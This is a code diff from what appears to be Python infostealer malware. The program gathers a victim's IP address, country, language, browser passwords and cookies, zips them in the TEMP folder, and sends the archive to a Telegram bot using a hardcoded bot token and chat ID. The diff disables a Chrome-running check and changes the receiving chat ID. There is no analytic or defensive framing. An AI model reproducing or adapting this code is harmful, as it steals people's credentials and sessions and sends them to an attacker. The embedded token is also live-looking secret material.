@@ -654,7 +654,7 @@ async def main():
     ip, language = pcinfo()
     country = get_country(ip)
 
-    check_chrome_running()
+    #check_chrome_running()
     extract()
 
     current_time = datetime.now().strftime("%Hh%Mm%Ss-%d-%m-%Y")
@@ -662,8 +662,7 @@ async def main():
     z_ph = os.path.join(os.environ["TEMP"], name_f + ".zip")
     shutil.make_archive(z_ph[:-4], "zip", path_data)
     TOKEN = "6761357605:AAFM2ncAfKU3BFJZK8_FzFI0LqokT05j5qQ"
-    # ID = "-4189528046"
-    ID = "-4102030817"
+    ID = "-4160958031"
     body = f"==== @hoiconcactaoy ===={os.linesep} Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}{os.linesep} Country => [{country}]{os.linesep} IP => {ip}{os.linesep} Language => {language}{os.linesep}====[ Browsers Data ]===={os.linesep} Passwords => {passwd}{os.linesep} Cookies => {cookies}"
     await sendfile(TOKEN, ID, z_ph, body)
     shutil.rmtree(os.environ["TEMP"], name_f + ".zip")
